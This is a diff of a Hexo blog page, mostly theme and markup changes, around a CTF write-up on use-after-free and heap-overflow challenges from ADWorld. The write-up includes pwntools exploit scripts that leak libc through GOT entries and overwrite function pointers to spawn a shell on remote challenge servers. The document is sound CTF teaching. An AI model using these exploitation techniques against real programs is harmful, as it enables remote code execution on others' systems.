@@ -35,10 +35,10 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/img/wang.svg","avatar":"/img/aliwangwang.svg","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Gamer","Learner"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
-    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
   </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
@@ -46,13 +46,15 @@
 <body>
 <div class="progress-bar-container">
     
+        <span class="scroll-progress-bar"></span>
+    
 
     
 </div>
 
 
-<main class="page-container border-box">
 
+<main class="page-container border-box">
     <!-- home first screen  -->
     
 
@@ -78,49 +80,59 @@
             <div class="pc">
                 <ul class="menu-list">
                     
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/"
                             >
+                                
                                 HOME
                             </a>
                         </li>
                     
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/archives"
                             >
+                                
                                 ARCHIVES
                             </a>
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                CATEGORIES
-                            </a>
-                        </li>
-                    
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/tags"
                             >
+                                
                                 TAGS
                             </a>
                         </li>
                     
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/about"
                             >
+                                
                                 ABOUT
                             </a>
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="fas search fa-search"></i>
                         </li>
                     
                 </ul>
@@ -139,29 +151,39 @@
     <div class="header-drawer">
         <ul class="drawer-menu-list">
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/">HOME</a>
+                       href="/"
+                    >HOME</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/archives">ARCHIVES</a>
+                       href="/archives"
+                    >ARCHIVES</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/categories">CATEGORIES</a>
+                       href="/tags"
+                    >TAGS</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/tags">TAGS</a>
+                       href="/categories"
+                    >CATEGORIES</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/about">ABOUT</a>
+                       href="/about"
+                    >ABOUT</a>
                 </li>
             
         </ul>
@@ -177,61 +199,57 @@
         <div class="page-main-content-middle border-box">
 
             <div class="main-content border-box">
-
                 
 
-                    <div class="fade-in-down-animation">
+                    
+<div class="fade-in-down-animation">
     <div class="post-page-container border-box">
-
-        <div class="article-content-container border-box">
-
+        <div class="post-content-container border-box">
             
 
-            <div class="article-content-bottom border-box">
+            <div class="post-content-bottom border-box">
                 
-                    <div class="article-title">
+                    <div class="post-title">
                         ADWorld PWN Challenge Area Write-ups (UAF)
                     </div>
                 
 
                 
-                    <div class="article-header border-box">
+                    <div class="post-header border-box">
                         
                             <div class="avatar-box border-box">
                                 <img src="/img/aliwangwang.svg">
                             </div>
                         
                         <div class="info-box">
-                            <div class="author">
+                            <div class="author border-box">
                                 <span class="name">TyeYeah</span>
                                 
-                                    <span class="author-label">Lv4</span>
+                                    <span class="author-badge">Lv4</span>
                                 
                             </div>
                             <div class="meta-info border-box">
                                 
 
-<div class="article-meta-info-container border-box post">
-    <div class="article-meta-info border-box">
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
         
 
-
         
-            <span class="meta-info-item article-create-date">
-                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
-                <span class="pc">2020-08-14 20:13:35</span>
-                <span class="mobile">2020-08-14 20:13</span>
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2020-08-14 20:13:35</span>
             </span>
 
-            <span class="meta-info-item article-update-date">
+            <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc" data-updated="Wed Sep 22 2021 17:05:16 GMT+0800">2021-09-22 17:05:16</span>
+                <span class="datetime" data-updated="Wed Sep 22 2021 17:05:16 GMT+0800">2021-09-22 17:05:16</span>
             </span>
         
 
         
-            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
-                <ul class="article-category-ul">
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
                     
                             <li class="category-item"><a href="/categories/CTF/">CTF</a></li>
                         
@@ -241,9 +259,8 @@
         
 
         
-            <span class="article-tag meta-info-item border-box">
-                <i class="icon fas fa-tags"></i>&nbsp;
-                <ul class="article-tag-ul">
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
                         
@@ -266,12 +283,12 @@
 
         
         
-            <span class="meta-info-item article-wordcount">
+            <span class="meta-info-item post-wordcount">
                 <i class="icon fas fa-file-word"></i>&nbsp;<span>3.8k Words</span>
             </span>
         
         
-            <span class="meta-info-item article-min2read">
+            <span class="meta-info-item post-min2read">
                 <i class="icon fas fa-clock"></i>&nbsp;<span>23 Mins</span>
             </span>
         
@@ -286,7 +303,7 @@
                     </div>
                 
 
-                <div class="article-content keep-markdown-body">
+                <div class="post-content keep-markdown-body">
                     
 
                     <p>This part is about <code>UAF</code> (Use After Free).</p>
@@ -337,8 +354,8 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 <p><code>sub_80488A5</code> (3. Print note):</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80488A5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">    (*(<span class="built_in"><span class="keyword">void</span></span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1])(ptr[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>It can only save 5 records, and every record contains two items: <code>ptr[i]</code> for <code>puts(*(const char **)(a1 + 4))</code> function pointer, and <code>*(ptr[i]+1)</code> for saving contents.<br>In <code>sub_8048646</code> (1. Add note) it <code>malloc()</code> memory for <code>ptr[i]</code> and <code>*(ptr[i]+1)</code>,but only reads the content to fill <code>*(ptr[i]+1)</code>.<br>In <code>sub_80487D4</code> (2. Delete note) it just <code>free</code> two pointers but not set them as <code>NULL</code>, which leads to <code>UAF</code>.<br>In <code>sub_80488A5</code> (3. Print note) it executes <code>(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</code> to <code>puts</code> contents, and here we can exploit.</p>
-<p>The basic data structure is like (after the first <code>add</code>):<br><img src="/imghost/apcaw/uaf1.svg" alt="basic data structure"><br>The first 4 bytes of <code>ptr[i]</code> is fixed assigned as <code>sub_804862B</code> – a special <code>puts</code> that can print <code>content</code> correctly. Our aim is to change its value via illegal method.</p>
-<p>If we do 2 <code>add</code> operations, memory looks like:<br><img src="/imghost/apcaw/uaf2.svg" alt="after 2 add"><br>Next <code>delete</code> index <code>0</code>, then <code>1</code>. As <code>fastbin</code> is <code>LIFO</code> (last in first out), and chunks with same size are in the same linked list, we can see 4 freed chunks in it like:<br><img src="/imghost/apcaw/uaf3.svg" alt="after 2 delete"><br>If then we <code>add</code> a 8 bytes size item, it will use 2 8-byte chunks in the fastbin, that would be:<br><img src="/imghost/apcaw/uaf4.svg" alt="after 3rd add"><br>Now we can edit content in old <code>ptr[0]</code>. But there is <code>UAF</code> in <code>delete</code>, so <code>ptr[0]</code> can also be called, which lets us execute our target function.</p>
+<p>The basic data structure is like (after the first <code>add</code>):<br><img   src="/imghost/apcaw/uaf1.svg"  alt="basic data structure"><br>The first 4 bytes of <code>ptr[i]</code> is fixed assigned as <code>sub_804862B</code> – a special <code>puts</code> that can print <code>content</code> correctly. Our aim is to change its value via illegal method.</p>
+<p>If we do 2 <code>add</code> operations, memory looks like:<br><img   src="/imghost/apcaw/uaf2.svg"  alt="after 2 add"><br>Next <code>delete</code> index <code>0</code>, then <code>1</code>. As <code>fastbin</code> is <code>LIFO</code> (last in first out), and chunks with same size are in the same linked list, we can see 4 freed chunks in it like:<br><img   src="/imghost/apcaw/uaf3.svg"  alt="after 2 delete"><br>If then we <code>add</code> a 8 bytes size item, it will use 2 8-byte chunks in the fastbin, that would be:<br><img   src="/imghost/apcaw/uaf4.svg"  alt="after 3rd add"><br>Now we can edit content in old <code>ptr[0]</code>. But there is <code>UAF</code> in <code>delete</code>, so <code>ptr[0]</code> can also be called, which lets us execute our target function.</p>
 <p>Since it has no <code>system</code>, we need to leak <code>libc</code> for it, then we can calcute <code>libc</code> base address and use shellcode to get shell.</p>
 <h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>Since we replace <code>sub_804862B</code> in <code>ptr[i]</code> as <code>system</code> address, but we execute <code>(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]); </code> so we add <code>;</code> or <code>||</code> to make sure <code>sh</code> can be executed.</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43549</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">putstr_addr = <span class="number">0x804862B</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Note size :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(putstr_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">puts_addr=u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line">libc_base_addr=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=p32(system_addr)+<span class="string">&quot;;sh&quot;</span> <span class="comment"># or &quot;||sh&quot; </span></span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -365,10 +382,10 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 <p>As we got <code>libc.so.6</code>, we can leak the <code>libc</code> base address to get shell. The function <code>list</code> gives us opportunity to print <code>description</code>, we can overwrite it as some function <code>GOT</code> item and use <code>list</code> to leak its address.</p>
 <p>Here is our plan:</p>
 <ol>
-<li>Add a commodity (commodity 0)<br><img src="/imghost/apcaw/uaf5.svg" alt="Step 1"></li>
-<li>Add another one (prevent from chunck merging)<br><img src="/imghost/apcaw/uaf6.svg" alt="Step 2"></li>
-<li>Edit commodity 0’s <code>description</code> to release it and allocate new space.<br>If commodity 1 and description 1 do not exist, it will just expand old description 0 instead of allocate a new memory.<br><img src="/imghost/apcaw/uaf7.svg" alt="Step 3"></li>
-<li>Add one more commodity (commodity 2).<br>Now if we edit description 0, we are editing commodity 2.<br><img src="/imghost/apcaw/uaf8.svg" alt="Step 4"></li>
+<li>Add a commodity (commodity 0)<br><img   src="/imghost/apcaw/uaf5.svg"  alt="Step 1"></li>
+<li>Add another one (prevent from chunck merging)<br><img   src="/imghost/apcaw/uaf6.svg"  alt="Step 2"></li>
+<li>Edit commodity 0’s <code>description</code> to release it and allocate new space.<br>If commodity 1 and description 1 do not exist, it will just expand old description 0 instead of allocate a new memory.<br><img   src="/imghost/apcaw/uaf7.svg"  alt="Step 3"></li>
+<li>Add one more commodity (commodity 2).<br>Now if we edit description 0, we are editing commodity 2.<br><img   src="/imghost/apcaw/uaf8.svg"  alt="Step 4"></li>
 <li>Edit description 0 to overwrite <code>description</code> pointer in commodity 2 as some function’s <code>GOT</code> item, and use <code>list commodities</code> to leak address.</li>
 </ol>
 <p>Note: Pay attention to chunck size. The description 0 we released should be <code>unsorted bin</code> instead of <code>fastbin</code>.<br>Because in <code>fastbin</code> it only allocates chunck with same size, while in <code>Change the description of a commodity</code> the last byte will be set <code>0</code>. In commodity the last part is <code>char *description</code> and it is where I write function’s <code>GOT</code> item, so it cannot be <code>0</code>. The chuncks in <code>fastbin</code> are between <code>0x20</code> and <code>0x80</code> bytes, so description 0 should be larger.</p>
@@ -379,7 +396,6 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 <p>Or even leak <code>__libc_start_main</code> and hijack it, only using heap overflow:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p =remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;31614&#x27;</span>)</span><br><span class="line">got = <span class="number">0x804b038</span> <span class="comment"># `got` item of `__libc_start_main`</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,price,descrip_size,description</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">name</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_price</span>(<span class="params">name,price</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_des</span>(<span class="params">name,descrip_size,description</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span>():</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;A&quot;</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="string">&quot;AAAA&quot;</span>)    </span><br><span class="line">change_des(<span class="string">&quot;A&quot;</span>,<span class="number">8</span>,<span class="string">&quot;C&quot;</span>*<span class="number">7</span>+<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span>*<span class="number">12</span>+ p32(<span class="number">0x21</span>) + p32(<span class="number">0x42</span>) + <span class="string">&quot;B&quot;</span>*<span class="number">12</span> + p32(<span class="number">0x00</span>) +p32(<span class="number">0x100</span>) +p32(got)</span><br><span class="line">change_des(<span class="string">&#x27;A&#x27;</span>,<span class="number">100</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;B: price.0, des.&quot;</span>)</span><br><span class="line">addr = p.recvn(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;addr:&quot;</span>,<span class="built_in">hex</span>(u32(addr))</span><br><span class="line">libc = u32(addr) - <span class="number">0x18540</span><span class="comment">#0x49020</span></span><br><span class="line">system_addr = libc + <span class="number">0x3a940</span></span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;libc:&quot;</span>,<span class="built_in">hex</span>(libc)</span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;system_addr:&quot;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">change_des(<span class="string">&quot;B&quot;</span>,<span class="number">0x100</span>,p32(system_addr)*<span class="number">5</span>)<span class="comment">#+&#x27;\n&#x27;</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
                 </div>
-
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -418,18 +434,18 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
                 
 
                 
-                    <div class="article-nav">
+                    <div class="post-nav border-box">
                         
-                            <div class="article-prev">
+                            <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
                                    href="/2020/08/29/2020-08-29-ADWorld-PWN-Challenge-Area-Write-ups-GOT-Hijacking/"
                                    title="ADWorld PWN Challenge Area Write-ups (GOT Hijacking)"
                                 >
                                     <span class="left arrow-icon flex-center">
-                                      <i class="fas fa-chevron-left"></i>
+                                        <i class="fas fa-chevron-left"></i>
                                     </span>
-                                            <span class="title flex-center">
+                                    <span class="title flex-center">
                                         <span class="post-nav-title-item text-ellipsis">ADWorld PWN Challenge Area Write-ups (GOT Hijacking)</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
@@ -437,7 +453,7 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
                             </div>
                         
                         
-                            <div class="article-next">
+                            <div class="next-post">
                                 <a class="next"
                                    rel="next"
                                    href="/2020/08/10/2020-08-10-ADWorld-PWN-Challenge-Area-Write-ups-Fmtstr/"
@@ -447,8 +463,8 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
                                         <span class="post-nav-title-item text-ellipsis">ADWorld PWN Challenge Area Write-ups (Fmtstr)</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
-                                            <span class="right arrow-icon flex-center">
-                                      <i class="fas fa-chevron-right"></i>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
                                     </span>
                                 </a>
                             </div>
@@ -484,7 +500,6 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 
                 
             </div>
-
         </div>
 
         <div class="page-main-content-bottom border-box">
@@ -540,6 +555,11 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 
         <!-- PC go comment -->
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
@@ -558,7 +578,7 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-dark-light-toggle flex-center">
+        <li class="tools-item tool-toggle-theme-mode flex-center">
             <i class="fas fa-moon"></i>
         </li>
 
@@ -655,7 +675,9 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 
 <script src="/js/back2top.js"></script>
 
-<script src="/js/dark-light-toggle.js"></script>
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
 
 <script src="/js/main.js"></script>
 
@@ -666,13 +688,6 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 
     
 <script src="/js/local-search.js"></script>
-
-
-
-<!-- code-block -->
-
-    
-<script src="/js/code-block.js"></script>
 
 
 
@@ -700,10 +715,16 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
         
     
 
-    <!-- category-page -->
+    <!-- categories page -->
     
 
-    <!-- links-page -->
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
 
